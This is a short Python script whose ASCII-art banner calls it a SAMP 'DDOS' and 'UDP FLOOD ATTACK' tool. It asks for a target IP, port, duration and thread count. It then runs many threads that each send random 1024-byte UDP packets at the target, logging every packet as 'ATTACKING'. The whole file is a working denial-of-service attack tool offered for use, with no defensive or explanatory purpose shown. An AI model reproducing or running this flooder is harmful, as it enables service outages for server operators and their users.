import socket, random, time
from sys import exit
from threading import Thread

print("""\033[93m
\033[93m
 █████                          ███               
░░███                          ░░░                
 ░███         ██████   ███████ ████  ████████     
 ░███        ███░░███ ███░░███░░███ ░░███░░███    
 ░███       ░███ ░███░███ ░███ ░███  ░███ ░███    
 ░███      █░███ ░███░███ ░███ ░███  ░███ ░███    
 ███████████░░██████ ░░███████ █████ ████ █████   
░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░    
                      ███ ░███                    
                     ░░██████                     
                      ░░░░░░  
             """)


print("""
  	●   BY. PH~Matt/NUDOS   ●
	♧ SAMP NUDOS - DDOS SAMP ♧ 
	
	  - UDP FLOOD ATTACK -
""")


try:
	ip = str(input("[>] IP: "))
	port = int(input("[>] PORT (0 for random): "))
	floodtime = time.time() + int(input("[>] Time: "))
	thread = int(input("[>] Thread: "))
except Exception:
	exit("ERROR: Invalid Port, Time or Thread Try again")


def udpsirisakz(count = 0):
	while time.time() < floodtime:
		count += 1
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
				dport = random.randint(1, 65535) if port == 0 else port
				data = random._urandom(1024)
				sock.sendto(data, (ip, dport))
				print(f"\033[38;5;123m[{count}] | SAMP NUDOS UDP - ATTACKING | IP: {ip} PORT: {dport}")
		except socket.gaierror:
			print("[!] Invalid IP")
			break


for x in range(thread):
	Thread(target=udpsirisakz).start()